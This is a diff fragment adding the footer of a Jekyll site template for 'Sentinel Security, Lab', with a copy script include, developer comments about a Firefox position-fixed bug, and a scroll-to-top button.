+                    <li class="outstanding"><a>SENTINEL SECURITY, LAB</a></li>
+                    <li class="outstanding"><a>Jekyll Ver 3.9.5.</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div><!--/footerwrap -->
+
+    </body>
+
+    <script src="/assets/js/copy.js"></script>
+<!--TODONE.
+**FireFox display BUG**
+position-fixed in FireFox display position -> none
+- Reference:
+    - { @link https://developer.mozilla.org/zh-CN/docs/Web/CSS/position#browser_compatibility }
+    - { @link https://blog.csdn.net/DDD4V/article/details/123354124 }
+    - { @link https://juejin.cn/post/6844904100576886797 }
+        - { @link Demo https://codepen.io/li377242494/pen/VwLGGaR }
+Fiex In `[assets/css/style.scss](https://github.com/Bin4xin/bin4xin.github.io/blob/main/assets/css/style.scss)`
+    - tooltipped css postion.
+-->
+
+<!--<link rel="preload" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" as="style"/>-->
+<!--<link rel="stylesheet" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" data-n-g=""/>-->
+
+<divs role="tooltip" class="position-fixed bottom-0 mb-4 right-5 mr-4 z-1 transition-200 opacity-0" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+    <button class="tooltipped tooltipped-n tooltipped-no-delay color-bg-accent-emphasis color-fg-on-emphasis circle border-0" style="width:45px;height:45px"
+            aria-label="滚动到顶部">
+        <svg aria-hidden="true" role="img" class="octicon octicon-chevron-up" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+            <path fill-rule="evenodd" d="M3.22 9.78a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 0l4.25 4.25a.75.75 0 01-1.06 1.06L8 6.06 4.28 9.78a.75.75 0 01-1.06 0z">
+            </path>
+        </svg>
+    </button>
+</divs>
+
+
+</html>
